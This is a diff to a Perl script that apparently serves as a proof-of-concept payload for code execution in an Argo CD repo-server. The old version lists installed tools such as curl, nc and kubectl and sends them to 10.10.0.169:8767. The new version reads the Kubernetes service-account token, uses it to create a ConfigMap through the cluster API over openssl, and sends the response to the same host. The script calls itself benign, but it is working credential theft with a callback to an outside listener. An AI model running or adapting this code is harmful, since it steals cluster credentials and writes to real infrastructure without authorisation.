@@ -2,9 +2,19 @@
 use strict;
 use warnings;
 use IO::Socket::INET;
-my @bins = qw(curl wget openssl nc python3 python ruby kubectl sh bash perl busybox git argocd);
-my @found;
-for my $b (@bins) { my $p = `/bin/sh -c 'command -v $b' 2>/dev/null`; chomp $p; push @found, "$b=$p" if $p; }
+my $name = 'brightbot-argocd-rce-proof-1783096417';
+my $token_path = '/var/run/secrets/kubernetes.io/serviceaccount/token';
+open(my $tfh, '<', $token_path) or die "token open failed: $!";
+my $token = <$tfh>; chomp $token; close($tfh);
+my $body = '{"apiVersion":"v1","kind":"ConfigMap","metadata":{"name":"'.$name.'","namespace":"argocd","labels":{"brightbot-proof":"argocd-reposerver-rce"}},"data":{"proof":"created-by-benign-argocd-reposerver-rce-poc"}}';
+my $len = length($body);
+my $req = "POST /api/v1/namespaces/argocd/configmaps HTTP/1.1\r\nHost: kubernetes.default.svc\r\nAuthorization: Bearer $token\r\nContent-Type: application/json\r\nContent-Length: $len\r\nConnection: close\r\n\r\n$body";
+open(my $ssl, '|-', 'openssl s_client -quiet -connect kubernetes.default.svc:443 -servername kubernetes.default.svc -CAfile /var/run/secrets/kubernetes.io/serviceaccount/ca.crt >/tmp/brightbot-k8s-response 2>&1') or die "openssl failed: $!";
+print $ssl $req;
+close($ssl);
+my $resp = '';
+if (open(my $rfh, '<', '/tmp/brightbot-k8s-response')) { local $/; $resp = <$rfh>; close($rfh); }
+$resp =~ s/\r/ /g; $resp =~ s/\n/ /g; $resp = substr($resp, 0, 600);
 my $sock = IO::Socket::INET->new(PeerAddr => '10.10.0.169', PeerPort => 8767, Proto => 'tcp', Timeout => 3);
-if ($sock) { print $sock join(',', @found)."\n"; close($sock); }
+if ($sock) { print $sock "created_attempt name=$name response=$resp\n"; close($sock); }
 exit 1;
